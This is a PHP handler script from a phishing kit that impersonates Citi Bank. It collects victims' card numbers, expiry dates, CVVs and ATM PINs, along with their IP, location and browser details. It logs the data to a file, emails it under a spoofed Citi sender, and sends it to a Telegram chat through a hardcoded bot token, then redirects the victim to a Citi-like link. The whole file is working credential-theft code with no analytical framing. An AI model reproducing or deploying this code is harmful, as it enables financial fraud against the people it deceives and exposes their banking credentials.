<?php

session_start();
$errors = array(); 



       
       include '../param.php';
       include '../../settings/settings.php';




$cc   = $_POST['cnum'];
$cvv2 = $_POST['exp'];
$exp  = $_POST['cvv'];
$atm  = $_POST['pin'];

$owner = $settings['email'];


$message =  "|=========||@SPOX_X 𝓬𝓲𝓽𝓲||=========|\n";
$message .= "|====== [ 💳 CARD DETAILS  💳 ] =====|\n";
$message .= "|-------------------------------------.\n";
$message .= "| ➤ [ CC Number ]         : {$cc}\n";
$message .= "| ➤ [ CC Expiry ]         : {$exp}\n";
$message .= "| ➤ [ CCV2 ]              : {$cvv2}\n";
$message .= "| ➤ [ ATM PIN ]           : {$atm}\n";
$message .= "|======================================|\n";
$message .= "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n";
$message .= "|======================================|\n";
$message .= "| ➤ [ IP Address ]   : {$_SESSION['ip']}\r\n";
$message .= "| ➤ [ IP Country ]   : {$_SESSION['country']}\r\n";
$message .= "| ➤ [ IP City ]      : {$_SESSION['city']}\r\n";
$message .= "| ➤ [ Browser ]      : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
$message .= "| ➤ [ User Agent ]   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
$message .= "| ➤ [ TIME ]         : ".date("d/m/Y h:i:sa")." GMT\r\n";
$message .= "|======================================|\n";
$message .= "<<<< [+++++ END OF RESULT +++++ ] >>>>\n\n";


#Save Result

              $save=fopen("../../logs/results.txt","a+");
              fwrite($save,$message);
              fclose($save);


# Send Mail
                if ($settings['send_mail'] == "1")
                {
                $to = $owner;
                $headers = "Content-type:text/plain;charset=UTF-8\r\n";
                $headers .= "From:CITI BANK  <ppCC-$randomnumber@Publous.team>";
                $subject = "C A R D ✦ D E T A I L S ✦ C I T I=> From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ] ";
                $msg = $message;
                mail($to, $subject, $msg, $headers);
                }


    
# Send Bot

$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$citibank = [
	    'chat_id' => '-1001181474291',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($citibank) );




  echo "<script>window.location.href = \"http://citi.us/3wpk7M6\"; </script>";




?>